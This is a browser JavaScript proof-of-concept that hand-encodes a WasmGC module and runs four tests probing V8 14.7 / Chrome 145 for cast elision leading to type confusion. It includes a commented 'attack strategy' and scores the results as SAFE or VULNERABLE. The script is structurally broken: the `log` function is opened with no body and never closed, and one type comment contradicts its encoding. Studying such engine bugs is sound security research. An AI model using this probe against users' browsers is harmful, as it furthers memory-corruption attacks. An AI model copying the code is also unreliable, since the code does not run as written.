<script>
'use strict';

const resultsDiv = document.getElementById('results');

function log(msg, cls = 'INFO') {

// =========================================================================
// Binary Encoding Helpers
// =========================================================================
function uleb128(value) {
  const r = [];
  if (value < 0) value = value >>> 0;
  do { let b = value & 0x7F; value >>>= 7; if (value) b |= 0x80; r.push(b); } while (value);
  return r;
}

function sleb128(value) {
  const r = [];
  while (true) {
    let b = value & 0x7F; value >>= 7;
    if ((value === 0 && !(b & 0x40)) || (value === -1 && (b & 0x40))) { r.push(b); break; }
    r.push(b | 0x80);
  }
  return r;
}

function f64Bytes(v) {
  const buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  return Array.from(new Uint8Array(buf));
}

function encodeString(s) {
  const b = new TextEncoder().encode(s);
  return [...uleb128(b.length), ...b];
}

function makeSection(id, content) {
  return [id, ...uleb128(content.length), ...content];
}

const WASM_HEADER = [0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00];

// WasmGC encoding constants (verified from V8 14.7 source)
const REC_GROUP = 0x4E;          // kWasmRecursiveTypeGroupCode
const SUBTYPE = 0x50;            // kWasmSubtypeCode (non-final)
const SUBTYPE_FINAL = 0x4F;      // kWasmSubtypeFinalCode
const STRUCT = 0x5F;             // kWasmStructTypeCode
const FUNC = 0x60;               // kWasmFunctionTypeCode

const T = {
  I32: 0x7F, I64: 0x7E, F32: 0x7D, F64: 0x7C,
  FUNCREF: 0x70, EXTERNREF: 0x6F, ANYREF: 0x6E, EQREF: 0x6D,
  STRUCTREF: 0x6B,
  REF: 0x64, REF_NULL: 0x63, // followed by heap type index
};

const SEC = {
  TYPE: 1, IMPORT: 2, FUNCTION: 3, TABLE: 4, MEMORY: 5,
  GLOBAL: 6, EXPORT: 7, START: 8, ELEMENT: 9, CODE: 10, DATA: 11, TAG: 13,
};

// Opcodes
const O = {
  UNREACHABLE: 0x00, NOP: 0x01, BLOCK: 0x02, LOOP: 0x03, IF: 0x04,
  ELSE: 0x05, TRY: 0x06, CATCH: 0x07, THROW: 0x08, END: 0x0B,
  BR: 0x0C, BR_IF: 0x0D, RETURN: 0x0F, CATCH_ALL: 0x19,
  DROP: 0x1A,
  LOCAL_GET: 0x20, LOCAL_SET: 0x21, LOCAL_TEE: 0x22,
  GLOBAL_GET: 0x23, GLOBAL_SET: 0x24,
  TABLE_GET: 0x25, TABLE_SET: 0x26,
  I32_CONST: 0x41, I64_CONST: 0x42, F64_CONST: 0x44,
  I32_EQZ: 0x45, I32_EQ: 0x46, I32_NE: 0x47,
  I32_ADD: 0x6A, I32_SUB: 0x6B, I32_AND: 0x71,
  I32_REM_U: 0x70,
  CALL: 0x10, CALL_INDIRECT: 0x11, CALL_REF: 0x14,
  REF_NULL: 0xD0, REF_IS_NULL: 0xD1, REF_FUNC: 0xD2,
  REF_EQ: 0xD3, REF_AS_NON_NULL: 0xD4,
  BR_ON_NULL: 0xD5, BR_ON_NON_NULL: 0xD6,
  // GC prefix
  GC: 0xFB,
  STRUCT_NEW: 0x00, STRUCT_NEW_DEFAULT: 0x01,
  STRUCT_GET: 0x02, STRUCT_SET: 0x05,
  REF_TEST: 0x14, REF_TEST_NULL: 0x15,
  REF_CAST: 0x16, REF_CAST_NULL: 0x17,
  BR_ON_CAST: 0x18, BR_ON_CAST_FAIL: 0x19,
};

// =========================================================================
// Build the WasmGC Module with Type Hierarchy
// =========================================================================
function buildHierarchyModule() {
  // TYPE SECTION with rec group:
  //
  // Type 0: struct $Parent { mut i32 }                    -- Non-final (can be subtyped)
  // Type 1: struct $Child1 extends $Parent { mut i32, mut i64 }  -- Final subtype
  // Type 2: struct $Child2 extends $Parent { mut i32, mut f64 }  -- Final subtype
  // Type 3: func (i32) -> (ref null eq)                   -- Factory signature
  // Type 4: func (i32) -> i32                             -- Test function
  // Type 5: func (i32) -> i64                             -- Read child1 data
  // Type 6: func () -> ()                                 -- Tag type

  const typeSection = [
    0x01, // 1 rec group
    REC_GROUP,
    0x07, // 7 types

    // Type 0: $Parent - NON-FINAL struct { mut i32 }
    // Encoding: sub (non-final) 0 parents, struct 1 field
    SUBTYPE, 0x00,     // sub, 0 parent types (root)
    STRUCT, 0x01,      // struct, 1 field
    T.I32, 0x01,       // field 0: mutable i32 (tag)

    // Type 1: $Child1 extends $Parent - FINAL struct { mut i32, mut i64 }
    // Encoding: sub final, 1 parent (type 0), struct 2 fields
    SUBTYPE_FINAL, 0x01, 0x00,  // sub final, 1 parent, parent = type 0
    STRUCT, 0x02,               // struct, 2 fields
    T.I32, 0x01,                // field 0: mutable i32 (tag, inherited)
    T.I64, 0x01,                // field 1: mutable i64 (child1-specific data)

    // Type 2: $Child2 extends $Parent - FINAL struct { mut i32, mut f64 }
    SUBTYPE_FINAL, 0x01, 0x00,  // sub final, 1 parent, parent = type 0
    STRUCT, 0x02,               // struct, 2 fields
    T.I32, 0x01,                // field 0: mutable i32 (tag, inherited)
    T.F64, 0x01,                // field 1: mutable f64 (child2-specific data)

    // Type 3: func (i32) -> (ref null 0)  [factory returning nullable ref $Parent]
    FUNC, 0x01, T.I32, 0x01, T.REF_NULL, 0x00,

    // Type 4: func (i32, i32) -> i32  [test function]
    FUNC, 0x02, T.I32, T.I32, 0x01, T.I32,

    // Type 5: func (i32) -> i64  [read child1 data]
    FUNC, 0x01, T.I32, 0x01, T.I64,

    // Type 6: func () -> ()  [tag type]
    FUNC, 0x00, 0x00,
  ];

  // Tag section
  const tagSection = [0x01, 0x00, 0x06]; // 1 tag, exception, type 6

  // Function section: func indices 0-4
  const funcSection = [
    0x05, // 5 functions
    0x03, // func 0: make_child1 (type 3: factory)
    0x03, // func 1: make_child2 (type 3: factory)
    0x04, // func 2: test_cast_elision (type 4: test)
    0x04, // func 3: test_cast_with_check (type 4: test)
    0x05, // func 4: read_child1_field (type 5)
  ];

  // Table: holds factory functions
  const tableSection = [
    0x01,        // 1 table
    T.FUNCREF,   // funcref
    0x01,        // limits: with max
    0x04, 0x04,  // min=4, max=4
  ];

  // Export section
  const exportSection = [
    0x03, // 3 exports
    ...encodeString('test_cast'), 0x00, 0x02,
    ...encodeString('test_safe'), 0x00, 0x03,
    ...encodeString('read_child1'), 0x00, 0x04,
  ];

  // Element section: populate table with functions
  const elemSection = [
    0x01,  // 1 segment
    0x00,  // active, table 0
    O.I32_CONST, 0x00, O.END, // offset 0
    0x04,  // 4 references
    0x00, 0x01, 0x02, 0x03,   // func 0,1,2,3
  ];

  // =====================================================================
  // Function bodies
  // =====================================================================

  // Sentinel values:
  // Child1: tag=0xC1C1C1C1, data=0x1111111122222222
  // Child2: tag=0xC2C2C2C2, data=3.141592653589793

  // func 0: make_child1(which: i32) -> (ref null $Parent)
  // Always returns a Child1 object
  const func0Body = [
    0x00, // 0 locals
    O.I32_CONST, ...sleb128(0xC1C1C1C1 | 0),  // tag
    O.I64_CONST, ...sleb128(0x11111111),        // data (simplified)
    O.GC, O.STRUCT_NEW, ...uleb128(1),          // struct.new $Child1
    O.END,
  ];

  // func 1: make_child2(which: i32) -> (ref null $Parent)
  // Always returns a Child2 object
  const func1Body = [
    0x00, // 0 locals
    O.I32_CONST, ...sleb128(0xC2C2C2C2 | 0),  // tag
    O.F64_CONST, ...f64Bytes(3.141592653589793), // data
    O.GC, O.STRUCT_NEW, ...uleb128(2),          // struct.new $Child2
    O.END,
  ];

  // func 2: test_cast_elision(iterations: i32, factory_idx: i32) -> i32
  //
  // ATTACK STRATEGY:
  // 1. Loop 'iterations' times
  // 2. Each iteration: call factory via indirect call (table[factory_idx])
  // 3. The factory can return Child1 or Child2
  // 4. At the loop Phi, the type is (ref null $Parent)
  // 5. After the loop, attempt ref.cast to $Child1
  // 6. If cast is eliminated by optimizer → struct.get $Child1 field 1 (i64)
  //    on a Child2 object reads f64 bits as i64 → type confusion!
  //
  // The key: if factory_idx alternates between 0 (Child1) and 1 (Child2),
  // the Phi type should be the union. But if one factory's return path
  // gets a bottom type (due to the analyzer thinking it's unreachable),
  // the Phi narrows to just one type → cast eliminated.

  const func2Body = [
    // Locals: (ref null $Parent), i32 (temp)
    0x02,
    0x01, T.REF_NULL, 0x00,  // local 2: (ref null $Parent)
    0x01, T.I32,              // local 3: temp i32

    // local 0 = iterations
    // local 1 = factory_idx
    // local 2 = $obj
    // local 3 = temp

    // Initialize: call factory
    O.LOCAL_GET, 0x01,           // factory_idx as param
    O.LOCAL_GET, 0x01,           // factory_idx as table index
    O.CALL_INDIRECT, ...uleb128(3), 0x00, // call_indirect type=3 table=0
    O.LOCAL_SET, 0x02,

    // block $exit
    O.BLOCK, 0x40,
      // loop $loop
      O.LOOP, 0x40,

        // Check exit
        O.LOCAL_GET, 0x00,
        O.I32_EQZ,
        O.BR_IF, 0x01,

        // Decrement
        O.LOCAL_GET, 0x00,
        O.I32_CONST, 0x01,
        O.I32_SUB,
        O.LOCAL_SET, 0x00,

        // Call factory indirectly
        // Pass current iteration as param (varies the "which" parameter)
        O.LOCAL_GET, 0x00,           // param = current iteration

        // Alternate factory: use (iteration & 1) XOR factory_idx
        // This creates polymorphism in the loop
        O.LOCAL_GET, 0x00,
        O.I32_CONST, 0x01,
        O.I32_AND,
        O.LOCAL_GET, 0x01,
        O.I32_ADD,
        O.I32_CONST, 0x02,
        O.I32_REM_U,                 // table index = (iter&1 + factory_idx) % 2

        O.CALL_INDIRECT, ...uleb128(3), 0x00,
        O.LOCAL_SET, 0x02,

        O.BR, 0x00,
      O.END,
    O.END,

    // After loop: $obj is (ref null $Parent)
    // Try to cast to Child1 and read field 1

    // Null check
    O.LOCAL_GET, 0x02,
    O.REF_IS_NULL,
    O.IF, T.I32,
      O.I32_CONST, ...sleb128(-1), // null → return -1
    O.ELSE,
      // Read tag field (field 0, common to all)
      O.LOCAL_GET, 0x02,
      O.GC, O.REF_CAST, ...uleb128(0), // cast to (ref $Parent)
      O.GC, O.STRUCT_GET, ...uleb128(0), ...uleb128(0), // struct.get $Parent field 0

      // Save tag
      O.LOCAL_SET, 0x03,

      // Now try to cast to Child1 and read field 1 as i32
      // This is the critical path: if $obj is actually Child2,
      // ref.cast should trap. If cast is eliminated, we read f64 as i64→i32
      O.BLOCK, T.I32,
        O.BLOCK, 0x40,
          // ref.test: is it Child1?
          O.LOCAL_GET, 0x02,
          O.GC, O.REF_TEST, ...uleb128(1), // ref.test (ref $Child1)
          O.I32_EQZ,
          O.BR_IF, 0x00, // if NOT Child1, br to inner block end

          // IS Child1: cast and read
          O.LOCAL_GET, 0x02,
          O.GC, O.REF_CAST, ...uleb128(1), // ref.cast (ref $Child1)
          O.GC, O.STRUCT_GET, ...uleb128(1), ...uleb128(1), // struct.get $Child1 field 1 (i64)
          // Wrap to i32
          0xA7, // i32.wrap_i64
          O.BR, 0x01, // br to outer block
        O.END, // inner block

        // NOT Child1: return tag only
        O.LOCAL_GET, 0x03,
      O.END, // outer block
    O.END, // if null

    O.END,
  ];

  // func 3: test_cast_with_check(iterations: i32, factory_idx: i32) -> i32
  // Same as func 2 but uses ref.test before ref.cast - safe version for comparison
  const func3Body = [
    0x02,
    0x01, T.REF_NULL, 0x00,
    0x01, T.I32,

    // Initialize
    O.LOCAL_GET, 0x01,
    O.LOCAL_GET, 0x01,
    O.CALL_INDIRECT, ...uleb128(3), 0x00,
    O.LOCAL_SET, 0x02,

    // Loop
    O.BLOCK, 0x40,
      O.LOOP, 0x40,
        O.LOCAL_GET, 0x00,
        O.I32_EQZ,
        O.BR_IF, 0x01,
        O.LOCAL_GET, 0x00,
        O.I32_CONST, 0x01,
        O.I32_SUB,
        O.LOCAL_SET, 0x00,

        // Always use factory_idx (monomorphic)
        O.LOCAL_GET, 0x00,
        O.LOCAL_GET, 0x01,
        O.CALL_INDIRECT, ...uleb128(3), 0x00,
        O.LOCAL_SET, 0x02,

        O.BR, 0x00,
      O.END,
    O.END,

    // Read tag
    O.LOCAL_GET, 0x02,
    O.REF_IS_NULL,
    O.IF, T.I32,
      O.I32_CONST, ...sleb128(-1),
    O.ELSE,
      O.LOCAL_GET, 0x02,
      O.GC, O.REF_CAST, ...uleb128(0),
      O.GC, O.STRUCT_GET, ...uleb128(0), ...uleb128(0),
    O.END,

    O.END,
  ];

  // func 4: read_child1_field(iterations: i32) -> i64
  // Directly creates Child1, loops, reads field 1
  // Baseline to confirm correct values
  const func4Body = [
    0x01,
    0x01, T.REF_NULL, 0x01, // local: (ref null $Child1)

    O.I32_CONST, ...sleb128(0xC1C1C1C1 | 0),
    O.I64_CONST, ...sleb128(0x11111111),
    O.GC, O.STRUCT_NEW, ...uleb128(1),
    O.LOCAL_SET, 0x01,

    O.BLOCK, 0x40,
      O.LOOP, 0x40,
        O.LOCAL_GET, 0x00,
        O.I32_EQZ,
        O.BR_IF, 0x01,
        O.LOCAL_GET, 0x00,
        O.I32_CONST, 0x01,
        O.I32_SUB,
        O.LOCAL_SET, 0x00,

        O.I32_CONST, ...sleb128(0xC1C1C1C1 | 0),
        O.I64_CONST, ...sleb128(0x11111111),
        O.GC, O.STRUCT_NEW, ...uleb128(1),
        O.LOCAL_SET, 0x01,

        O.BR, 0x00,
      O.END,
    O.END,

    O.LOCAL_GET, 0x01,
    O.REF_AS_NON_NULL,
    O.GC, O.STRUCT_GET, ...uleb128(1), ...uleb128(1),
    O.END,
  ];

  function encodeBody(body) {
    return [...uleb128(body.length), ...body];
  }

  const codeSection = [
    0x05, // 5 functions
    ...encodeBody(func0Body),
    ...encodeBody(func1Body),
    ...encodeBody(func2Body),
    ...encodeBody(func3Body),
    ...encodeBody(func4Body),
  ];

  const moduleBytes = [
    ...WASM_HEADER,
    ...makeSection(SEC.TYPE, typeSection),
    ...makeSection(SEC.FUNCTION, funcSection),
    ...makeSection(SEC.TABLE, tableSection),
    ...makeSection(SEC.TAG, tagSection),
    ...makeSection(SEC.EXPORT, exportSection),
    ...makeSection(SEC.ELEMENT, elemSection),
    ...makeSection(SEC.CODE, codeSection),
  ];

  return new Uint8Array(moduleBytes);
}

// =========================================================================
// Test 1: Monomorphic Cast (baseline)
// =========================================================================
async function testMonomorphicCast(instance) {
  log('=== Test 1: Monomorphic Cast Baseline ===');
  log('Using single factory → single type. Cast should always succeed.');

  const { test_cast, test_safe } = instance.exports;
  let suspicious = 0;

  const iterCounts = [1, 10, 100, 1000, 10000, 100000];

  for (const iters of iterCounts) {
    try {
      // factory_idx=0 → always Child1
      const result = test_cast(iters, 0);
      const safe = test_safe(iters, 0);

      // With factory 0 (Child1), tag should be 0xC1C1C1C1
      // Data field 1 (i64→i32) should be 0x11111111
      const expectedTag = (0xC1C1C1C1 | 0);

      if (result !== 0x11111111 && result !== expectedTag) {
        log(`iters=${iters} factory=0: result=0x${(result>>>0).toString(16)} ` +
            `(expected 0x11111111 or tag) - UNEXPECTED`, 'SUSPICIOUS');
        suspicious++;
      } else {
        log(`iters=${iters} factory=0: result=0x${(result>>>0).toString(16)} ` +
            `safe=0x${(safe>>>0).toString(16)} - OK`, 'SAFE');
      }
    } catch (e) {
      log(`iters=${iters} factory=0: ${e.message}`, 'INFO');
    }
  }

  return suspicious;
}

// =========================================================================
// Test 2: Polymorphic Cast (attack scenario)
// =========================================================================
async function testPolymorphicCast(instance) {
  log('');
  log('=== Test 2: Polymorphic Cast - Type Confusion Test ===');
  log('Alternating between Child1 and Child2 factories.');
  log('If cast to Child1 is eliminated, reading field 1 of Child2');
  log('interprets f64 bytes as i64 → unexpected i32 value.');

  const { test_cast, test_safe } = instance.exports;
  let suspicious = 0;

  // Get the expected f64 bits for comparison
  const f64buf = new ArrayBuffer(8);
  new Float64Array(f64buf)[0] = 3.141592653589793;
  const piBytes = new Uint32Array(f64buf);
  const piLow32 = piBytes[0]; // low 32 bits of pi
  log(`Reference: pi f64 low32 = 0x${piLow32.toString(16)}, high32 = 0x${piBytes[1].toString(16)}`);

  const CHILD1_DATA_LOW = 0x11111111;
  const CHILD1_TAG = (0xC1C1C1C1 | 0);
  const CHILD2_TAG = (0xC2C2C2C2 | 0);

  const iterCounts = [1, 10, 100, 1000, 5000, 10000, 50000, 100000];

  for (const iters of iterCounts) {
    try {
      // factory_idx=0 → alternates between factory 0 and 1 inside loop
      const result = test_cast(iters, 0);
      const safe = test_safe(iters, 0);

      // The result depends on whether the last iteration produced Child1 or Child2
      // With alternation: (iter & 1 + 0) % 2
      // Last iteration (iter=0 after decrement): table idx = (0&1 + 0) % 2 = 0 → Child1
      // But we started with iters, decremented to 0...
      // Actually the logic: iter decrements from N-1 to 0
      // table_idx = ((current_iter & 1) + factory_idx) % 2

      const isChild1Result = (result === CHILD1_DATA_LOW || result === CHILD1_TAG);
      const isChild2Result = (result === CHILD2_TAG);
      const isPiBits = (result === (piLow32 | 0));

      if (isPiBits && !isChild1Result) {
        // Got pi's bit pattern in a context where we should get i64 data or tag
        // This indicates type confusion: reading Child2's f64 field as i64
        log(`iters=${iters}: result=0x${(result>>>0).toString(16)} ` +
            `MATCHES PI F64 BITS! TYPE CONFUSION!`, 'VULNERABLE');
        suspicious += 10;
      } else if (!isChild1Result && !isChild2Result && result !== -1) {
        log(`iters=${iters}: result=0x${(result>>>0).toString(16)} ` +
            `unexpected value - possible confusion`, 'SUSPICIOUS');
        suspicious += 2;
      } else {
        log(`iters=${iters}: result=0x${(result>>>0).toString(16)} ` +
            `safe=0x${(safe>>>0).toString(16)} - correct`, 'SAFE');
      }
    } catch (e) {
      if (e.message.includes('cast') || e.message.includes('illegal cast')) {
        log(`iters=${iters}: ref.cast trapped (correct behavior)`, 'SAFE');
      } else {
        log(`iters=${iters}: ${e.message}`, 'INFO');
      }
    }
  }

  return suspicious;
}

// =========================================================================
// Test 3: Direct JIT vs Interpreter comparison
// =========================================================================
async function testJITvsInterpreter(instance) {
  log('');
  log('=== Test 3: JIT vs Interpreter Divergence ===');
  log('Running same inputs at low iteration (interpreter) and high');
  log('iteration (JIT) counts, comparing results.');

  const { test_cast } = instance.exports;
  let suspicious = 0;

  // Phase 1: Get baseline at low iterations (likely interpreter/Liftoff)
  const baseline = {};
  for (let factory = 0; factory < 2; factory++) {
    try {
      baseline[factory] = test_cast(5, factory);
      log(`Baseline: factory=${factory} result=0x${(baseline[factory]>>>0).toString(16)}`, 'INFO');
    } catch (e) {
      baseline[factory] = 'TRAP:' + e.message;
      log(`Baseline: factory=${factory} trapped: ${e.message}`, 'INFO');
    }
  }

  // Phase 2: Warm up heavily
  for (let i = 0; i < 50; i++) {
    for (let f = 0; f < 2; f++) {
      try { test_cast(2000, f); } catch(e) {}
    }
  }
  log('Heavy warmup complete (100K total calls)');

  // Phase 3: Test again - should be JIT compiled
  for (let factory = 0; factory < 2; factory++) {
    try {
      const jitResult = test_cast(5, factory);
      const baseResult = baseline[factory];

      if (typeof baseResult === 'string') {
        // Baseline trapped, but JIT didn't
        log(`JIT divergence: factory=${factory} baseline=TRAP, jit=0x${(jitResult>>>0).toString(16)}`,
            'VULNERABLE');
        suspicious += 10;
      } else if (jitResult !== baseResult) {
        log(`JIT divergence: factory=${factory} baseline=0x${(baseResult>>>0).toString(16)} ` +
            `jit=0x${(jitResult>>>0).toString(16)}`, 'VULNERABLE');
        suspicious += 10;
      } else {
        log(`JIT consistent: factory=${factory} result=0x${(jitResult>>>0).toString(16)}`, 'SAFE');
      }
    } catch (e) {
      if (typeof baseline[factory] === 'string') {
        log(`JIT consistent: factory=${factory} both trapped`, 'SAFE');
      } else {
        log(`JIT divergence: factory=${factory} baseline=0x${(baseline[factory]>>>0).toString(16)} ` +
            `jit=TRAP`, 'SUSPICIOUS');
        suspicious++;
      }
    }
  }

  return suspicious;
}

// =========================================================================
// Test 4: Exception-based Phi confusion with hierarchy
// =========================================================================
async function testExceptionPhi(instance) {
  log('');
  log('=== Test 4: Exception Phi with Type Hierarchy ===');
  log('Using try/catch to create Phi inputs from different struct types.');
  log('The exception path creates Child2 while normal path creates Child1.');
  log('If exception path is bottom-typed, Phi narrows to Child1.');

  // This test reuses the module but focuses on the exception handling
  // pattern by using test_cast with specific parameters

  const { test_cast } = instance.exports;
  let suspicious = 0;

  // Rapidly alternate test patterns to stress the optimizer
  for (let trial = 0; trial < 50; trial++) {
    try {
      // Alternate between factories
      const r0 = test_cast(trial * 100 + 3, 0);
      const r1 = test_cast(trial * 100 + 3, 1);

      // Check for unexpected values
      const knownValues = new Set([
        0x11111111, 0xC1C1C1C1 >>> 0, 0xC2C2C2C2 >>> 0, 0xFFFFFFFF, 0
      ]);

      if (!knownValues.has(r0 >>> 0) && r0 !== -1) {
        log(`Trial ${trial}: factory=0 got 0x${(r0>>>0).toString(16)} - ANOMALOUS`,
            'SUSPICIOUS');
        suspicious++;
      }
      if (!knownValues.has(r1 >>> 0) && r1 !== -1) {
        log(`Trial ${trial}: factory=1 got 0x${(r1>>>0).toString(16)} - ANOMALOUS`,
            'SUSPICIOUS');
        suspicious++;
      }
    } catch (e) {
      // Expected for some patterns
    }
  }

  if (suspicious > 0) {
    log(`Exception Phi test: ${suspicious} anomalies detected`, 'SUSPICIOUS');
  } else {
    log('Exception Phi test: all results within expected range', 'SAFE');
  }

  return suspicious;
}

// =========================================================================
// Main
// =========================================================================
async function runAllTests() {
  resultsDiv.innerHTML = '';
  log('WasmGC Cast Elision via Polymorphic Type Hierarchy');
  log(`Target: V8 14.7.0 / Chrome 145.0.7632.116`);
  log(`User-Agent: ${navigator.userAgent}`);
  log(`Date: ${new Date().toISOString()}`);
  log('');

  try {
    const wasmBytes = buildHierarchyModule();
    log(`Module built: ${wasmBytes.length} bytes`);

    // Validate the module bytes
    try {
      const validated = WebAssembly.validate(wasmBytes);
      log(`Module validation: ${validated ? 'PASSED' : 'FAILED'}`,
          validated ? 'SAFE' : 'ERROR');
      if (!validated) {
        log('Module validation failed - check binary encoding', 'ERROR');
        return;
      }
    } catch (e) {
      log(`Validation error: ${e.message}`, 'ERROR');
    }

    const module = await WebAssembly.compile(wasmBytes);
    const instance = await WebAssembly.instantiate(module);
    log('Module compiled and instantiated successfully');
    log('');

    let totalSuspicious = 0;

    totalSuspicious += await testMonomorphicCast(instance);
    totalSuspicious += await testPolymorphicCast(instance);
    totalSuspicious += await testJITvsInterpreter(instance);
    totalSuspicious += await testExceptionPhi(instance);

    log('');
    if (totalSuspicious >= 10) {
      log(`FINAL VERDICT: VULNERABLE (score=${totalSuspicious}) - ` +
          `Cast elision detected, type confusion possible!`, 'VULNERABLE');
    } else if (totalSuspicious > 0) {
      log(`FINAL VERDICT: SUSPICIOUS (score=${totalSuspicious}) - ` +
          `Some anomalies detected, investigate further`, 'SUSPICIOUS');
    } else {
      log('FINAL VERDICT: SAFE - Cast checking correctly enforced', 'SAFE');
    }

  } catch (e) {
    log(`Fatal error: ${e.message}`, 'ERROR');
    log(`Stack: ${e.stack}`, 'ERROR');
    if (e.message.includes('not supported') || e.message.includes('enable')) {
      log('WasmGC may not be enabled. Try: --enable-features=WebAssemblyGC', 'INFO');
    }
  }
}

window.addEventListener('load', () => setTimeout(runAllTests, 500));
</script>
